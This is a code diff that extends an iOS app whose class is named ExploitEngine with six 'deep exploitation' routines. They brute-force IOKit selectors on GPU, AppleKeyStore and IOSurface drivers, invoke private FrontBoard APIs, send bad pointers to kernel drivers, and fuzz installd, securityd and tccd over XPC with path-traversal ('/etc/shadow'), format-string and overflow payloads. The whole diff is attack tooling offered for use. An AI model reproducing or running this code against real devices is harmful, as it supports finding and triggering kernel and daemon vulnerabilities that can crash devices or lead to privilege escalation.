@@ -24,6 +24,7 @@
 #import <sys/sysctl.h>
 #import <sys/fcntl.h>
 #import <sys/mman.h>
+#import <signal.h>
 #import <dlfcn.h>
 #import <objc/runtime.h>
 #import <objc/message.h>
@@ -116,6 +117,14 @@ static void load_xpc_symbols(void) {
 + (NSString *)runMobileGestaltQueries;
 + (NSString *)runSpringBoardInteraction;
 + (NSString *)runEntitlementProbing;
+
+// Deep exploitation methods
++ (NSString *)runAGXDeepProbe;
++ (NSString *)runAppleKeyStoreExploit;
++ (NSString *)runFBSystemServiceInvoke;
++ (NSString *)runIOSurfaceMemoryOps;
++ (NSString *)runXPCTargetedFuzz;
++ (NSString *)runCrashOracle;
 
 @end
 
@@ -1435,6 +1444,637 @@ static void load_xpc_symbols(void) {
     return log;
 }
 
+#pragma mark - AGX Deep Probing
+
++ (NSString *)runAGXDeepProbe {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== AGXAccelerator Deep Probing ===\n\n"];
+
+    mach_port_t masterPort = kIOMainPortDefault;
+
+    // Find AGX family services
+    NSArray *agxServices = @[
+        @"AGXAccelerator",
+        @"AGXAcceleratorG13G",
+        @"AGXAcceleratorG14P",
+        @"IOGPU",
+        @"IOGPUDevice"
+    ];
+
+    for (NSString *serviceName in agxServices) {
+        io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching([serviceName UTF8String]));
+        if (service == IO_OBJECT_NULL) continue;
+
+        [log appendFormat:@"[+] Found %@: 0x%x\n", serviceName, service];
+
+        // Try multiple user client types
+        for (uint32_t clientType = 0; clientType < 8; clientType++) {
+            io_connect_t conn;
+            kern_return_t kr = IOServiceOpen(service, mach_task_self(), clientType, &conn);
+            if (kr != KERN_SUCCESS) continue;
+
+            [log appendFormat:@"\n[!] Opened %@ type %u: 0x%x\n", serviceName, clientType, conn];
+
+            // Enumerate external methods
+            [log appendString:@"    Probing external methods:\n"];
+
+            for (uint32_t selector = 0; selector < 100; selector++) {
+                uint64_t scalarIn[16] = {0};
+                uint64_t scalarOut[16] = {0};
+                uint32_t scalarOutCnt = 16;
+                size_t structOutSize = 0;
+
+                kr = IOConnectCallMethod(conn, selector,
+                    scalarIn, 0, NULL, 0,
+                    scalarOut, &scalarOutCnt, NULL, &structOutSize);
+
+                // Skip common error codes
+                if (kr == 0xe00002c2 || kr == 0xe00002bc) continue; // BadArgument, Unsupported
+
+                [log appendFormat:@"    [%u] 0x%x", selector, kr];
+                if (kr == KERN_SUCCESS) {
+                    [log appendString:@" SUCCESS"];
+                    if (scalarOutCnt > 0) {
+                        [log appendFormat:@" out[0]=0x%llx", scalarOut[0]];
+                    }
+                }
+                [log appendString:@"\n"];
+            }
+
+            // Try structured input
+            [log appendString:@"\n    Testing structured input:\n"];
+            char structIn[256] = {0};
+            char structOut[256] = {0};
+            size_t structOutLen = sizeof(structOut);
+
+            // Fill with pattern
+            memset(structIn, 0x41, sizeof(structIn));
+
+            for (uint32_t sel = 0; sel < 20; sel++) {
+                structOutLen = sizeof(structOut);
+                kr = IOConnectCallMethod(conn, sel,
+                    NULL, 0, structIn, sizeof(structIn),
+                    NULL, NULL, structOut, &structOutLen);
+
+                if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                    [log appendFormat:@"    Struct[%u]: 0x%x (outLen=%zu)\n", sel, kr, structOutLen];
+                }
+            }
+
+            IOServiceClose(conn);
+        }
+        IOObjectRelease(service);
+    }
+
+    [log appendString:@"\n[*] AGX deep probe complete\n"];
+    return log;
+}
+
+#pragma mark - AppleKeyStore Exploitation
+
++ (NSString *)runAppleKeyStoreExploit {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== AppleKeyStore Exploitation ===\n\n"];
+
+    mach_port_t masterPort = kIOMainPortDefault;
+    io_service_t keystore = IOServiceGetMatchingService(masterPort, IOServiceMatching("AppleKeyStore"));
+
+    if (keystore == IO_OBJECT_NULL) {
+        [log appendString:@"[-] AppleKeyStore not found\n"];
+        return log;
+    }
+
+    [log appendFormat:@"[+] Found AppleKeyStore: 0x%x\n", keystore];
+
+    io_connect_t conn;
+    kern_return_t kr = IOServiceOpen(keystore, mach_task_self(), 0, &conn);
+
+    if (kr != KERN_SUCCESS) {
+        [log appendFormat:@"[-] Cannot open: 0x%x\n", kr];
+        IOObjectRelease(keystore);
+        return log;
+    }
+
+    [log appendFormat:@"[!] Opened connection: 0x%x\n\n", conn];
+
+    // Known AppleKeyStore selectors
+    // 0: getSystemKeyUID, 1: getPasscodeGeneration, 16: getKeyGeneration
+    // 17: registerDevice, 20-25: various key operations
+
+    [log appendString:@"[*] Testing known selectors...\n"];
+
+    // Selector 0: getSystemKeyUID
+    {
+        uint64_t out[4] = {0};
+        uint32_t outCnt = 4;
+        kr = IOConnectCallScalarMethod(conn, 0, NULL, 0, out, &outCnt);
+        [log appendFormat:@"    [0] getSystemKeyUID: 0x%x", kr];
+        if (kr == KERN_SUCCESS && outCnt > 0) {
+            [log appendFormat:@" = 0x%llx", out[0]];
+        }
+        [log appendString:@"\n"];
+    }
+
+    // Selector 1: getPasscodeGeneration
+    {
+        uint64_t out[4] = {0};
+        uint32_t outCnt = 4;
+        kr = IOConnectCallScalarMethod(conn, 1, NULL, 0, out, &outCnt);
+        [log appendFormat:@"    [1] getPasscodeGen: 0x%x", kr];
+        if (kr == KERN_SUCCESS && outCnt > 0) {
+            [log appendFormat:@" = %lld", out[0]];
+        }
+        [log appendString:@"\n"];
+    }
+
+    // Selector 16: getKeyGeneration
+    {
+        uint64_t in[1] = {0}; // keyClass
+        uint64_t out[4] = {0};
+        uint32_t outCnt = 4;
+        kr = IOConnectCallScalarMethod(conn, 16, in, 1, out, &outCnt);
+        [log appendFormat:@"    [16] getKeyGen: 0x%x", kr];
+        if (kr == KERN_SUCCESS && outCnt > 0) {
+            [log appendFormat:@" = %lld", out[0]];
+        }
+        [log appendString:@"\n"];
+    }
+
+    // Test structured methods for key operations
+    [log appendString:@"\n[*] Testing structured key operations...\n"];
+
+    // Try creating a key bag query
+    struct __attribute__((packed)) {
+        uint32_t version;
+        uint32_t type;
+        uint8_t uuid[16];
+    } keybagQuery = {0};
+
+    keybagQuery.version = 1;
+    keybagQuery.type = 0; // System keybag
+
+    char outBuf[1024] = {0};
+    size_t outLen = sizeof(outBuf);
+
+    kr = IOConnectCallMethod(conn, 3, // getPersonalizedKeybag
+        NULL, 0, &keybagQuery, sizeof(keybagQuery),
+        NULL, NULL, outBuf, &outLen);
+    [log appendFormat:@"    [3] getKeybag: 0x%x (outLen=%zu)\n", kr, outLen];
+
+    // Probe all selectors with different input sizes
+    [log appendString:@"\n[*] Full selector enumeration...\n"];
+
+    for (uint32_t sel = 0; sel < 50; sel++) {
+        uint64_t scalarIn[8] = {0, 0, 0, 0, 0, 0, 0, 0};
+        uint64_t scalarOut[8] = {0};
+        uint32_t outCnt = 8;
+
+        kr = IOConnectCallScalarMethod(conn, sel, scalarIn, 1, scalarOut, &outCnt);
+        if (kr != 0xe00002c2 && kr != 0xe00002bc && kr != 0xe00002c7) {
+            [log appendFormat:@"    [%u] 0x%x", sel, kr];
+            if (kr == KERN_SUCCESS && outCnt > 0) {
+                [log appendFormat:@" out=0x%llx", scalarOut[0]];
+            }
+            [log appendString:@"\n"];
+        }
+    }
+
+    IOServiceClose(conn);
+    IOObjectRelease(keystore);
+
+    [log appendString:@"\n[*] AppleKeyStore exploitation complete\n"];
+    return log;
+}
+
+#pragma mark - FBSystemService Invocation
+
++ (NSString *)runFBSystemServiceInvoke {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== FBSystemService Invocation ===\n\n"];
+
+    // Load FrontBoardServices
+    void *fbsHandle = dlopen("/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices", RTLD_NOW);
+    if (!fbsHandle) {
+        [log appendFormat:@"[-] Cannot load FrontBoardServices: %s\n", dlerror()];
+        return log;
+    }
+
+    [log appendString:@"[+] FrontBoardServices loaded\n"];
+
+    // Get FBSSystemService
+    Class FBSSystemService = NSClassFromString(@"FBSSystemService");
+    if (!FBSSystemService) {
+        [log appendString:@"[-] FBSSystemService class not found\n"];
+        dlclose(fbsHandle);
+        return log;
+    }
+
+    [log appendString:@"[+] Found FBSSystemService\n"];
+
+    // Get shared service
+    SEL sharedServiceSel = NSSelectorFromString(@"sharedService");
+    if (![FBSSystemService respondsToSelector:sharedServiceSel]) {
+        [log appendString:@"[-] sharedService not available\n"];
+        dlclose(fbsHandle);
+        return log;
+    }
+
+    id service = [FBSSystemService performSelector:sharedServiceSel];
+    if (!service) {
+        [log appendString:@"[-] Failed to get shared service\n"];
+        dlclose(fbsHandle);
+        return log;
+    }
+
+    [log appendFormat:@"[!] Got FBSSystemService instance: %@\n\n", service];
+
+    // List all methods
+    unsigned int methodCount = 0;
+    Method *methods = class_copyMethodList([service class], &methodCount);
+    [log appendFormat:@"[*] Available methods (%u):\n", methodCount];
+
+    NSMutableArray *interestingMethods = [NSMutableArray array];
+    for (unsigned int i = 0; i < methodCount; i++) {
+        SEL sel = method_getName(methods[i]);
+        NSString *name = NSStringFromSelector(sel);
+        [log appendFormat:@"    %@\n", name];
+
+        // Collect interesting methods
+        if ([name containsString:@"pid"] || [name containsString:@"application"] ||
+            [name containsString:@"open"] || [name containsString:@"terminate"]) {
+            [interestingMethods addObject:name];
+        }
+    }
+    free(methods);
+
+    // Try to invoke safe methods
+    [log appendString:@"\n[*] Attempting method invocations...\n"];
+
+    // pidForApplication:
+    SEL pidForApp = NSSelectorFromString(@"pidForApplication:");
+    if ([service respondsToSelector:pidForApp]) {
+        NSArray *testApps = @[@"com.apple.springboard", @"com.apple.mobilesafari", @"com.apple.Preferences"];
+        for (NSString *app in testApps) {
+            pid_t pid = ((pid_t (*)(id, SEL, id))objc_msgSend)(service, pidForApp, app);
+            [log appendFormat:@"    pidForApplication:%@ = %d\n", app, pid];
+        }
+    }
+
+    // clientCallbackQueue
+    SEL callbackQueue = NSSelectorFromString(@"clientCallbackQueue");
+    if ([service respondsToSelector:callbackQueue]) {
+        id queue = [service performSelector:callbackQueue];
+        [log appendFormat:@"    clientCallbackQueue = %@\n", queue];
+    }
+
+    // systemApplicationBundleID
+    SEL sysBundleID = NSSelectorFromString(@"systemApplicationBundleID");
+    if ([service respondsToSelector:sysBundleID]) {
+        id bundleID = [service performSelector:sysBundleID];
+        [log appendFormat:@"    systemApplicationBundleID = %@\n", bundleID];
+    }
+
+    dlclose(fbsHandle);
+    [log appendString:@"\n[*] FBSystemService invocation complete\n"];
+    return log;
+}
+
+#pragma mark - IOSurface Memory Operations
+
++ (NSString *)runIOSurfaceMemoryOps {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== IOSurface Memory Operations ===\n\n"];
+
+    mach_port_t masterPort = kIOMainPortDefault;
+    io_service_t surfaceRoot = IOServiceGetMatchingService(masterPort, IOServiceMatching("IOSurfaceRoot"));
+
+    if (surfaceRoot == IO_OBJECT_NULL) {
+        [log appendString:@"[-] IOSurfaceRoot not found\n"];
+        return log;
+    }
+
+    [log appendFormat:@"[+] Found IOSurfaceRoot: 0x%x\n", surfaceRoot];
+
+    io_connect_t conn;
+    kern_return_t kr = IOServiceOpen(surfaceRoot, mach_task_self(), 0, &conn);
+
+    if (kr != KERN_SUCCESS) {
+        [log appendFormat:@"[-] Cannot open: 0x%x\n", kr];
+        IOObjectRelease(surfaceRoot);
+        return log;
+    }
+
+    [log appendFormat:@"[!] Opened connection: 0x%x\n\n", conn];
+
+    // Create an IOSurface
+    [log appendString:@"[*] Creating IOSurface...\n"];
+
+    // IOSurface creation properties
+    struct __attribute__((packed)) {
+        uint32_t width;
+        uint32_t height;
+        uint32_t pixelFormat;
+        uint32_t bytesPerElement;
+        uint32_t bytesPerRow;
+        uint32_t allocSize;
+    } surfaceProps = {
+        .width = 64,
+        .height = 64,
+        .pixelFormat = 0x42475241, // 'BGRA'
+        .bytesPerElement = 4,
+        .bytesPerRow = 64 * 4,
+        .allocSize = 64 * 64 * 4
+    };
+
+    uint64_t surfaceID = 0;
+    uint32_t outCnt = 1;
+
+    // Selector 0: s_create_surface
+    kr = IOConnectCallMethod(conn, 0,
+        NULL, 0, &surfaceProps, sizeof(surfaceProps),
+        &surfaceID, &outCnt, NULL, NULL);
+
+    if (kr == KERN_SUCCESS && surfaceID != 0) {
+        [log appendFormat:@"[!] Created surface ID: 0x%llx\n", surfaceID];
+
+        // Try to get surface info
+        char infoOut[256] = {0};
+        size_t infoLen = sizeof(infoOut);
+        uint64_t idIn = surfaceID;
+
+        // Selector 1: s_lookup_surface
+        kr = IOConnectCallMethod(conn, 1,
+            &idIn, 1, NULL, 0,
+            NULL, NULL, infoOut, &infoLen);
+        [log appendFormat:@"    Lookup: 0x%x (len=%zu)\n", kr, infoLen];
+
+        // Selector 6: s_get_ycbcr_matrix
+        kr = IOConnectCallScalarMethod(conn, 6, &idIn, 1, NULL, NULL);
+        [log appendFormat:@"    GetMatrix: 0x%x\n", kr];
+
+        // Try mapping surface
+        [log appendString:@"\n[*] Testing memory mapping...\n"];
+
+        mach_vm_address_t address = 0;
+        mach_vm_size_t size = 0;
+
+        // Selector 10: s_map
+        kr = IOConnectMapMemory64(conn, surfaceID, mach_task_self(),
+            &address, &size, kIOMapAnywhere);
+        if (kr == KERN_SUCCESS) {
+            [log appendFormat:@"[!] Mapped at 0x%llx (size: 0x%llx)\n", address, size];
+
+            // Write test pattern
+            if (address != 0) {
+                memset((void *)address, 0x42, MIN(256, size));
+                [log appendString:@"    Wrote test pattern\n"];
+                IOConnectUnmapMemory64(conn, surfaceID, mach_task_self(), address);
+            }
+        } else {
+            [log appendFormat:@"[-] Map failed: 0x%x\n", kr];
+        }
+
+        // Release surface
+        kr = IOConnectCallScalarMethod(conn, 2, &surfaceID, 1, NULL, NULL);
+        [log appendFormat:@"    Release: 0x%x\n", kr];
+
+    } else {
+        [log appendFormat:@"[-] Surface creation failed: 0x%x\n", kr];
+    }
+
+    // Enumerate all selectors
+    [log appendString:@"\n[*] Selector enumeration...\n"];
+    for (uint32_t sel = 0; sel < 30; sel++) {
+        uint64_t dummy[4] = {0};
+        uint32_t dummyCnt = 4;
+        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, dummy, &dummyCnt);
+        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+            [log appendFormat:@"    [%u] 0x%x\n", sel, kr];
+        }
+    }
+
+    IOServiceClose(conn);
+    IOObjectRelease(surfaceRoot);
+
+    [log appendString:@"\n[*] IOSurface memory operations complete\n"];
+    return log;
+}
+
+#pragma mark - XPC Targeted Fuzzing
+
++ (NSString *)runXPCTargetedFuzz {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== XPC Targeted Fuzzing ===\n\n"];
+
+    load_xpc_symbols();
+    if (!xpc_loaded) {
+        [log appendString:@"[-] XPC symbols not available\n"];
+        return log;
+    }
+
+    // High-value targets
+    NSDictionary *targets = @{
+        @"com.apple.installd": @[@"InstallDaemon", @"install", @"path", @"client"],
+        @"com.apple.securityd": @[@"SecItemAdd", @"SecItemCopyMatching", @"class", @"query"],
+        @"com.apple.tccd": @[@"TCCAccessRequest", @"service", @"client", @"pid"],
+        @"com.apple.containermanagerd": @[@"container", @"create", @"identifier", @"class"],
+        @"com.apple.lsd.mapdb": @[@"lookup", @"register", @"type", @"handler"]
+    };
+
+    for (NSString *service in targets) {
+        [log appendFormat:@"\n[*] Fuzzing %@...\n", service];
+
+        xpc_connection_t conn = _xpc_connection_create_mach_service([service UTF8String], NULL, 0);
+        if (!conn) {
+            [log appendString:@"    [-] Cannot connect\n"];
+            continue;
+        }
+
+        __block int crashes = 0;
+        __block int responses = 0;
+
+        _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+            if (event == _XPC_ERROR_CONNECTION_INTERRUPTED) crashes++;
+            else responses++;
+        });
+        _xpc_connection_resume(conn);
+
+        NSArray *keys = targets[service];
+
+        // Fuzz test 1: NULL dereference attempt
+        xpc_object_t msg1 = _xpc_dictionary_create(NULL, NULL, 0);
+        _xpc_dictionary_set_int64(msg1, [keys[0] UTF8String], 0);
+        _xpc_dictionary_set_int64(msg1, "pointer", 0x0);
+        _xpc_connection_send_message(conn, msg1);
+
+        // Fuzz test 2: Integer overflow
+        xpc_object_t msg2 = _xpc_dictionary_create(NULL, NULL, 0);
+        _xpc_dictionary_set_int64(msg2, [keys[0] UTF8String], 1);
+        _xpc_dictionary_set_int64(msg2, "size", 0xFFFFFFFFFFFFFFFF);
+        _xpc_dictionary_set_int64(msg2, "count", -1);
+        _xpc_connection_send_message(conn, msg2);
+
+        // Fuzz test 3: Path traversal
+        xpc_object_t msg3 = _xpc_dictionary_create(NULL, NULL, 0);
+        _xpc_dictionary_set_string(msg3, [keys[1] UTF8String], "../../../../../../etc/passwd");
+        _xpc_dictionary_set_string(msg3, "path", "/var/../../../etc/shadow");
+        _xpc_connection_send_message(conn, msg3);
+
+        // Fuzz test 4: Format string
+        xpc_object_t msg4 = _xpc_dictionary_create(NULL, NULL, 0);
+        _xpc_dictionary_set_string(msg4, [keys[2] UTF8String], "%s%s%s%s%s%s%s%s%s%s");
+        _xpc_dictionary_set_string(msg4, "name", "%n%n%n%n");
+        _xpc_connection_send_message(conn, msg4);
+
+        // Fuzz test 5: Large allocation
+        xpc_object_t msg5 = _xpc_dictionary_create(NULL, NULL, 0);
+        char largeBuf[4096];
+        memset(largeBuf, 'A', sizeof(largeBuf) - 1);
+        largeBuf[sizeof(largeBuf) - 1] = 0;
+        _xpc_dictionary_set_string(msg5, [keys[3] UTF8String], largeBuf);
+        _xpc_connection_send_message(conn, msg5);
+
+        // Fuzz test 6: Deeply nested structure
+        xpc_object_t msg6 = _xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t current = msg6;
+        for (int depth = 0; depth < 50; depth++) {
+            xpc_object_t inner = _xpc_dictionary_create(NULL, NULL, 0);
+            _xpc_dictionary_set_value(current, "nested", inner);
+            current = inner;
+        }
+        _xpc_connection_send_message(conn, msg6);
+
+        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
+
+        [log appendFormat:@"    Responses: %d, Interrupts: %d\n", responses, crashes];
+        if (crashes > 0) {
+            [log appendFormat:@"    [!] POTENTIAL CRASH DETECTED\n"];
+        }
+
+        _xpc_connection_cancel(conn);
+    }
+
+    [log appendString:@"\n[*] XPC targeted fuzzing complete\n"];
+    return log;
+}
+
+#pragma mark - Crash Oracle
+
++ (NSString *)runCrashOracle {
+    NSMutableString *log = [NSMutableString string];
+    [log appendString:@"=== Crash Oracle ===\n\n"];
+
+    [log appendString:@"[*] Testing crash-inducing patterns...\n\n"];
+
+    mach_port_t masterPort = kIOMainPortDefault;
+
+    // IOKit crash patterns
+    [log appendString:@"[1] IOKit crash patterns:\n"];
+
+    NSArray *dangerousServices = @[@"IOSurfaceRoot", @"AGXAccelerator", @"AppleKeyStore"];
+
+    for (NSString *serviceName in dangerousServices) {
+        io_service_t service = IOServiceGetMatchingService(masterPort, IOServiceMatching([serviceName UTF8String]));
+        if (service == IO_OBJECT_NULL) continue;
+
+        io_connect_t conn;
+        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+        if (kr != KERN_SUCCESS) {
+            IOObjectRelease(service);
+            continue;
+        }
+
+        [log appendFormat:@"    Testing %@:\n", serviceName];
+
+        // Pattern 1: Invalid memory pointer
+        uint64_t badPointer = 0xDEADBEEF;
+        kr = IOConnectCallScalarMethod(conn, 0, &badPointer, 1, NULL, NULL);
+        [log appendFormat:@"        BadPtr: 0x%x\n", kr];
+
+        // Pattern 2: Large size
+        uint64_t largeSize = 0xFFFFFFFF;
+        kr = IOConnectCallScalarMethod(conn, 0, &largeSize, 1, NULL, NULL);
+        [log appendFormat:@"        LargeSize: 0x%x\n", kr];
+
+        // Pattern 3: Negative value
+        uint64_t negative = (uint64_t)-1;
+        kr = IOConnectCallScalarMethod(conn, 0, &negative, 1, NULL, NULL);
+        [log appendFormat:@"        Negative: 0x%x\n", kr];
+
+        // Pattern 4: NULL struct
+        kr = IOConnectCallMethod(conn, 0, NULL, 0, (void*)0x1, 0x1000, NULL, NULL, NULL, NULL);
+        [log appendFormat:@"        NullStruct: 0x%x\n", kr];
+
+        IOServiceClose(conn);
+        IOObjectRelease(service);
+    }
+
+    // Mach port crash patterns
+    [log appendString:@"\n[2] Mach port patterns:\n"];
+
+    // Invalid port
+    mach_port_t invalidPort = 0xDEAD;
+    kern_return_t kr = mach_port_deallocate(mach_task_self(), invalidPort);
+    [log appendFormat:@"    InvalidPort dealloc: 0x%x\n", kr];
+
+    // Double deallocate attempt (safe - just tests the error)
+    mach_port_t testPort;
+    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &testPort);
+    if (kr == KERN_SUCCESS) {
+        mach_port_deallocate(mach_task_self(), testPort);
+        kr = mach_port_deallocate(mach_task_self(), testPort);
+        [log appendFormat:@"    Double dealloc: 0x%x\n", kr];
+    }
+
+    // Memory crash patterns
+    [log appendString:@"\n[3] Memory patterns:\n"];
+
+    // Try to detect heap state
+    void *testAlloc = malloc(1024);
+    if (testAlloc) {
+        memset(testAlloc, 0x41, 1024);
+        free(testAlloc);
+        [log appendString:@"    Heap alloc/free: OK\n"];
+    }
+
+    // VM operation
+    mach_vm_address_t vmAddr = 0;
+    kr = mach_vm_allocate(mach_task_self(), &vmAddr, 0x1000, VM_FLAGS_ANYWHERE);
+    if (kr == KERN_SUCCESS) {
+        // Try to write
+        memset((void*)vmAddr, 0x42, 0x1000);
+        mach_vm_deallocate(mach_task_self(), vmAddr, 0x1000);
+        [log appendString:@"    VM alloc/write/dealloc: OK\n"];
+    }
+
+    // Signal handler check
+    [log appendString:@"\n[4] Signal handling:\n"];
+
+    // Check if we can catch signals
+    struct sigaction oldHandler;
+    sigaction(SIGSEGV, NULL, &oldHandler);
+    [log appendFormat:@"    SIGSEGV handler: %s\n", oldHandler.sa_handler == SIG_DFL ? "default" : "custom"];
+
+    sigaction(SIGBUS, NULL, &oldHandler);
+    [log appendFormat:@"    SIGBUS handler: %s\n", oldHandler.sa_handler == SIG_DFL ? "default" : "custom"];
+
+    // Exception port check
+    [log appendString:@"\n[5] Exception ports:\n"];
+
+    exception_mask_t masks[EXC_TYPES_COUNT];
+    mach_msg_type_number_t maskCount = EXC_TYPES_COUNT;
+    exception_handler_t handlers[EXC_TYPES_COUNT];
+    exception_behavior_t behaviors[EXC_TYPES_COUNT];
+    thread_state_flavor_t flavors[EXC_TYPES_COUNT];
+
+    kr = task_get_exception_ports(mach_task_self(),
+        EXC_MASK_ALL, masks, &maskCount, handlers, behaviors, flavors);
+    [log appendFormat:@"    Exception ports query: 0x%x (count=%u)\n", kr, maskCount];
+
+    [log appendString:@"\n[*] Crash oracle complete\n"];
+    return log;
+}
+
 @end
 
 #pragma mark - View Controller
@@ -1470,6 +2110,12 @@ static void load_xpc_symbols(void) {
         @{@"title": @"MobileGestalt", @"desc": @"Device info enumeration"},
         @{@"title": @"SpringBoard", @"desc": @"App list & interaction"},
         @{@"title": @"Entitlements", @"desc": @"Privileged operation testing"},
+        @{@"title": @"AGX Deep Probe", @"desc": @"GPU driver selector fuzzing"},
+        @{@"title": @"KeyStore Exploit", @"desc": @"AppleKeyStore deep exploitation"},
+        @{@"title": @"FBS Invoke", @"desc": @"FBSystemService method calls"},
+        @{@"title": @"IOSurface Mem", @"desc": @"Surface creation & mapping"},
+        @{@"title": @"XPC Target Fuzz", @"desc": @"installd/securityd/tccd fuzzing"},
+        @{@"title": @"Crash Oracle", @"desc": @"Crash pattern detection"},
         @{@"title": @"Run All Tests", @"desc": @"Execute all exploits"}
     ];
     
@@ -1580,7 +2226,25 @@ static void load_xpc_symbols(void) {
             case 15:
                 result = [ExploitEngine runEntitlementProbing];
                 break;
-            case 16: {
+            case 16:
+                result = [ExploitEngine runAGXDeepProbe];
+                break;
+            case 17:
+                result = [ExploitEngine runAppleKeyStoreExploit];
+                break;
+            case 18:
+                result = [ExploitEngine runFBSystemServiceInvoke];
+                break;
+            case 19:
+                result = [ExploitEngine runIOSurfaceMemoryOps];
+                break;
+            case 20:
+                result = [ExploitEngine runXPCTargetedFuzz];
+                break;
+            case 21:
+                result = [ExploitEngine runCrashOracle];
+                break;
+            case 22: {
                 NSMutableString *all = [NSMutableString string];
                 [all appendString:[ExploitEngine getSystemInfo]];
                 [all appendString:@"\n\n"];
@@ -1613,6 +2277,18 @@ static void load_xpc_symbols(void) {
                 [all appendString:[ExploitEngine runSpringBoardInteraction]];
                 [all appendString:@"\n\n"];
                 [all appendString:[ExploitEngine runEntitlementProbing]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runAGXDeepProbe]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runAppleKeyStoreExploit]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runFBSystemServiceInvoke]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runIOSurfaceMemoryOps]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runXPCTargetedFuzz]];
+                [all appendString:@"\n\n"];
+                [all appendString:[ExploitEngine runCrashOracle]];
                 result = all;
                 break;
             }
